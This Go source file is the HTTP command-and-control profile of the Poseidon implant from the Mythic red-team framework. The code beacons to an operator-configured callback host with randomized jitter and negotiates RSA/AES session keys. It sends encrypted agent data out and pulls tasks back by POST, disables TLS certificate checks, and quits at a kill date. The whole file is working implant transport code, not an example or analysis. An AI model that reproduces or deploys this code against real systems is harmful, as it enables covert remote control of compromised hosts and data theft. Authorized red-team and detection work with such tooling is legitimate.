//go:build (linux || darwin) && http

package profiles

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"io"
	"os"

	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
// All variables must be a string so they can be set with ldflags

// callback_host is the callback host
var http_callback_host string

// callback_port is the callback port
var http_callback_port string

// killdate is the Killdate
var http_killdate string

// encrypted_exchange_check is Perform Key Exchange
var http_encrypted_exchange_check string

// callback_interval is the callback interval in seconds
var http_callback_interval string

// callback_jitter is Callback Jitter in percent
var http_callback_jitter string

// headers
var http_headers string

// AESPSK is the Crypto type
var http_AESPSK string

// post_uri is the POST request URI
var http_post_uri string

var http_proxy_host string
var http_proxy_port string
var http_proxy_user string
var http_proxy_pass string
var http_proxy_bypass string

type C2HTTP struct {
	BaseURL        string            `json:"BaseURL"`
	PostURI        string            `json:"PostURI"`
	ProxyURL       string            `json:"ProxyURL"`
	ProxyUser      string            `json:"ProxyUser"`
	ProxyPass      string            `json:"ProxyPass"`
	ProxyBypass    bool              `json:"ProxyBypass"`
	Interval       int               `json:"Interval"`
	Jitter         int               `json:"Jitter"`
	HeaderList     map[string]string `json:"Headers"`
	ExchangingKeys bool
	Key            string `json:"EncryptionKey"`
	RsaPrivateKey  *rsa.PrivateKey
	Killdate       time.Time `json:"KillDate"`
	ShouldStop     bool
	stoppedChannel chan bool
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func init() {
	var final_url string
	var last_slash int
	if http_callback_port == "443" && strings.Contains(http_callback_host, "https://") {
		final_url = http_callback_host
	} else if http_callback_port == "80" && strings.Contains(http_callback_host, "http://") {
		final_url = http_callback_host
	} else {
		last_slash = strings.Index(http_callback_host[8:], "/")
		if last_slash == -1 {
			//there is no 3rd slash
			final_url = fmt.Sprintf("%s:%s", http_callback_host, http_callback_port)
		} else {
			//there is a 3rd slash, so we need to splice in the port
			last_slash += 8 // adjust this back to include our offset initially
			//fmt.Printf("index of last slash: %d\n", last_slash)
			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
			final_url = fmt.Sprintf("%s:%s%s", string(http_callback_host[0:last_slash]), http_callback_port, string(http_callback_host[last_slash:]))
		}
	}
	if final_url[len(final_url)-1:] != "/" {
		final_url = final_url + "/"
	}
	//fmt.Printf("final url: %s\n", final_url)
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", http_killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2HTTP{
		BaseURL:        final_url,
		PostURI:        http_post_uri,
		ProxyUser:      http_proxy_user,
		ProxyPass:      http_proxy_pass,
		Key:            http_AESPSK,
		Killdate:       killDateTime,
		ShouldStop:     true,
		stoppedChannel: make(chan bool, 1),
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(http_callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(http_callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	// Add HTTP Headers
	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
	if err := json.Unmarshal([]byte(http_headers), &profile.HeaderList); err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
	}

	// Add proxy info if set
	if len(http_proxy_host) > 3 {
		profile.ProxyURL = fmt.Sprintf("%s:%s/", http_proxy_host, http_proxy_port)

		if len(http_proxy_user) > 0 && len(http_proxy_pass) > 0 {
			profile.ProxyUser = http_proxy_user
			profile.ProxyPass = http_proxy_pass
		}
	}

	// Convert ignore_proxy from string to bool
	profile.ProxyBypass, _ = strconv.ParseBool(http_proxy_bypass)

	if http_encrypted_exchange_check == "true" {
		profile.ExchangingKeys = true
	}
	RegisterAvailableC2Profile(&profile)
}

func (c *C2HTTP) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}
func (c *C2HTTP) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to http\n")
	<-c.stoppedChannel
	utils.PrintDebug("http fully stopped\n")
}
func (c *C2HTTP) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "BaseURL":
		c.BaseURL = value
	case "PostURI":
		c.PostURI = value
	case "ProxyUser":
		c.ProxyUser = value
	case "ProxyPass":
		c.ProxyPass = value
	case "ProxyBypass":
		c.ProxyPass = value
	case "EncryptionKey":
		c.Key = value
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "Headers":
		if err := json.Unmarshal([]byte(http_headers), &c.HeaderList); err != nil {
			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
		}
	}
}
func (c *C2HTTP) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2HTTP) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2HTTP) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2HTTP) ProfileName() string {
	return "http"
}

func (c *C2HTTP) IsP2P() bool {
	return false
}
func (c *C2HTTP) GetPushChannel() chan structs.MythicMessage {
	return nil
}

// CheckIn a new agent
func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			time.Sleep(time.Duration(c.GetSleepTime()))
			continue
		} else {
			resp := c.SendMessage(raw)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				time.Sleep(time.Duration(c.GetSleepTime()))
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				return response
			} else {
				time.Sleep(time.Duration(c.GetSleepTime()))
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2HTTP) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}
func (c *C2HTTP) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2HTTP) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2HTTP) IsRunning() bool {
	return !c.ShouldStop
}

var tr = &http.Transport{
	TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	MaxIdleConns:      1,
	MaxConnsPerHost:   1,
	DisableKeepAlives: true,
}
var client = &http.Client{
	Transport: tr,
}

// htmlPostData HTTP POST function
func (c *C2HTTP) SendMessage(sendData []byte) []byte {
	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
	//log.Println("Sending POST request to url: ", targeturl)
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	//fmt.Printf("Sending: %v\n", string(sendData))
	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes

	if len(c.ProxyURL) > 0 {
		proxyURL, _ := url.Parse(c.ProxyURL)
		tr.Proxy = http.ProxyURL(proxyURL)
	} else if !c.ProxyBypass {
		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
		tr.Proxy = http.ProxyFromEnvironment
	}

	contentLength := len(sendDataBase64)
	//byteBuffer := bytes.NewBuffer(sendDataBase64)
	// bail out of trying to send data after 5 failed attempts
	for i := 0; i < 5; i++ {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
			return []byte{}
		}
		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		} else if req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64)); err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
			continue
		} else {
			req.ContentLength = int64(contentLength)
			// set headers
			for key, val := range c.HeaderList {
				if key == "Host" {
					req.Host = val
				} else if key == "User-Agent" {
					req.Header.Set(key, val)
					tr.ProxyConnectHeader = http.Header{}
					tr.ProxyConnectHeader.Add("User-Agent", val)
				} else {
					req.Header.Set(key, val)
				}
			}
			if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
				auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
				basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
				req.Header.Add("Proxy-Authorization", basicAuth)
			}
			if resp, err := client.Do(req); err != nil {
				utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
				IncrementFailedConnection(c.ProfileName())
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			} else if resp.StatusCode != 200 {
				utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
				IncrementFailedConnection(c.ProfileName())
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			} else {
				defer resp.Body.Close()
				if body, err := io.ReadAll(resp.Body); err != nil {
					utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
					IncrementFailedConnection(c.ProfileName())
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				} else if raw, err := base64.StdEncoding.DecodeString(string(body)); err != nil {
					utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
					IncrementFailedConnection(c.ProfileName())
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				} else if len(raw) < 36 {
					utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
					IncrementFailedConnection(c.ProfileName())
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				} else if len(c.Key) != 0 {
					//log.Println("just did a post, and decrypting the message back")
					enc_raw := c.decryptMessage(raw[36:])
					if len(enc_raw) == 0 {
						// failed somehow in decryption
						utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
						IncrementFailedConnection(c.ProfileName())
						time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
						continue
					} else {
						//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
						return enc_raw
					}
				} else {
					//fmt.Printf("response: %v\n", string(raw))
					return raw[36:]
				}
			}
		}
	}
	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
	return make([]byte, 0) //shouldn't get here
}

func (c *C2HTTP) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2HTTP) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
